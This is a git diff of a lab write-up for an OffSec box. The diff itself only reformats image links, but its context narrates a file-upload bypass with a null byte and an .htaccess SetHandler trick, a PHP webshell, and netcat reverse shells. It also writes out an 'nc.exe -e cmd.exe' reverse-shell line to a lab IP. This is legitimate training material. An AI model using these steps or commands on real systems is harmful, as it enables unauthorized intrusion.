@@ -62,11 +62,11 @@ We can take note of the domain name `access.offsec` and add it to our `/etc/host
 
 Port 80 hosted an event site:
 
-<figure><img src="../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(317).png>)
 
 The entire site looked static, except for the buy tickets part:
 
-<figure><img src="../../../.gitbook/assets/image (3134).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3134).png>)
 
 We could upload files using this system. I ran a `gobuster` scan on this site and proxied traffic through Burpsuite. There weren't many interesting directories:
 
@@ -95,11 +95,11 @@ Earlier, our detailed `nmap` scan picked up on the HTTP Server Header having 'PH
 
 Attempting to upload files ending in `.php` result in this:
 
-<figure><img src="../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(95).png>)
 
 This is bypassable using a null byte:
 
-<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(554).png>)
 
 However, when we view our file, it does not execute our code.
 
@@ -125,15 +125,15 @@ SetHandler application/x-httpd-php
 </IfModule>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(763).png>)
 
 Then, we can upload our PHP webshell as `cmd.gif`, which would work properly now:
 
-<figure><img src="../../../.gitbook/assets/image (1613).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1613).png>)
 
 Then, we can get a reverse shell using `nc64.exe`.
 
-<figure><img src="../../../.gitbook/assets/image (639).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(639).png>)
 
 ## Privilege Escalation
 
@@ -198,7 +198,7 @@ access\svc_mssql
 
 Then, download another copy of `nc64.exe` and execute it to get another reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(981).png>)
 
 ### SeManageVolumePrivilege -> WerTrigger
 
@@ -255,6 +255,6 @@ C:\Users\svc_mssql\Desktop>.\WerTrigger.exe
 C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.191 21
 ```
 
-<figure><img src="../../../.gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(954).png>)
 
 Rooted!
